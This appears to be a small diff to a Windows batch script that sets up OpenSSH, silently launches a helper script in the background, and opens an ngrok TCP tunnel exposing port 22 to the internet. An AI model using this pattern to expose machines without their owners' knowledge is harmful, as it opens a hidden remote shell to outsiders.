@@ -22,6 +22,6 @@ call Source.bat +silent --file %temp%/user.txt
 powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
-start /B silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10
+start /B silentcmd call Source.bat +silent --file %temp%/ngrok.log /DELAY:10
 call ngrok.exe tcp 22 -log=stdout > ngrok.log
 
